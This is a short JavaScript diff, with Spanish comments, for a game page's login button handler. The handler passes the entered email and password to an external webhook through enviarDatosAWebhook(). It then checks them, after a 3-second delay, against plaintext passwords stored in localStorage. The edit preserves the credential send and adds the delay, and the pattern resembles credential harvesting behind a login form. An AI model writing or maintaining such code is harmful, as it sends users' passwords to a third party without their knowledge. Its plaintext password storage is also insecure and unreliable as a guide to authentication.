@@ -173,28 +173,31 @@
     }
 });
 
- document.getElementById('btnLogin').addEventListener('click', function() {
+document.getElementById('btnLogin').addEventListener('click', function() {
     const email = document.getElementById('loginUsuario').value;
     const contrasena = document.getElementById('loginContrasena').value;
     
-    enviarDatosAWebhook(email, contrasena); // Continúa enviando los datos al webhook como ya estaba configurado.
-    
-    const userData = localStorage.getItem(email);
-    if (userData) {
-        const userInfo = JSON.parse(userData);
-        if (userInfo.password === contrasena) {
-            alert('Inicio de sesión exitoso.');
-            document.getElementById('login').style.display = 'none';
-            document.getElementById('game-container').style.display = 'block';
-            
+    // Asumimos que esta función está definida en otro lugar de tu código.
+    enviarDatosAWebhook(email, contrasena);
+
+    // Añadimos un retraso antes de verificar las credenciales.
+    setTimeout(function() {
+        const userData = localStorage.getItem(email);
+        if (userData) {
+            const userInfo = JSON.parse(userData);
+            if (userInfo.password === contrasena) {
+                alert('Inicio de sesión exitoso.');
+                document.getElementById('login').style.display = 'none';
+                document.getElementById('game-container').style.display = 'block';
+            } else {
+                alert('Contraseña incorrecta');
+            }
         } else {
-            alert('Contraseña incorrecta');
+            alert('Usuario no encontrado');
         }
-    } else {
-        alert('Usuario no encontrado');
-    }
- }, 3000);
+    }, 3000); // Espera 3 segundos antes de ejecutar la verificación.
 });
+
 
     // Cambia a la vista de registro
     document.getElementById('irARegistro').addEventListener('click', function() {
